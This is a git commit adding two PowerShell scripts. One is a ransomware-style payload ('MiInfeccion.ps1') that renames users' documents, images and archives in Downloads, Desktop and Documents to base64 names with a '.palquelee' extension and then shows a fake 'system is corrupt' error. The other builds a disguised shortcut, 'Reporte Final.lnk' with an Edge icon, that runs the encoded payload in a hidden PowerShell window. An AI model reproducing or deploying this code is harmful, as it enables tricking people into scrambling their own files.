1ea21214335fabbf9702c319ee122ee028f21e3f
Joy Dragon <joydragon@gmail.com>
2023-08-09 12:51:55 -0400

    Agregados archivos para generar LNK

---
+++ MiInfeccion.ps1
@@ -0,0 +1,13 @@
+﻿$ext = @(".doc", ".docx", ".xls", ".xlsx", ".csv", ".ppt", ".pptx", ".msg", ".eml", ".pdf", ".txt", ".bat", ".com", ".zip", ".rar", ".7z", ".jpg", ".jpeg", ".png", ".gif");
+Get-ChildItem -Path (Get-ChildItem -Path Env:\USERPROFILE).value | ForEach-Object {
+    if($_.Name -eq "Downloads" -or $_.Name -eq "Dekstop" -or $_.Name -eq "Documents"){
+        Get-ChildItem -Recurse -Path $_.FullName | ForEach-Object {
+            if($ext.Contains($_.Extension.ToLower() )){
+                try{
+                    Rename-Item -Path $_.FullName -NewName ($_.DirectoryName + "\" + ([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($_.Name)) -replace "=","") +".palquelee");
+                }catch{}
+            }
+        }
+    }
+};
+Add-Type -AssemblyName Microsoft.VisualBasic;[Microsoft.VisualBasic.Interaction]::MsgBox("Ocurrió un error, el sistema esta corrupto.`nThere is an error the system is corrupt.",'OKOnly,SystemModal,Critical', 'ERROR') *> $null;
---
+++ crear LNK de infeccion.ps1
@@ -0,0 +1,17 @@
+﻿$base = $PSScriptRoot+"\";
+$archivo = "MiInfeccion.ps1"
+$archivo_lnk = "Reporte Final.lnk"
+
+$cont = Get-Content $base$archivo
+$cont = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cont))
+
+pylnk3 c --arguments "-WindowStyle hidden -e $cont" --icon "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --icon-index 13 --mode "Minimized" --description "Ransom64" "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" $base\$archivo_lnk
+
+<# Este codigo no funciona por usar API de Windows, se debe usar pylnk3
+$WshShell = New-Object -comObject WScript.Shell
+$Shortcut = $WshShell.CreateShortcut($base+"prueba_base.lnk")
+$Shortcut.TargetPath = "powershell.exe"
+$Shortcut.Arguments = "-WindowStyle hidden -e " + $cont
+$Shortcut.IconLocation = $env:SystemRoot + "\explorer.exe"
+$Shortcut.Save()
+#>
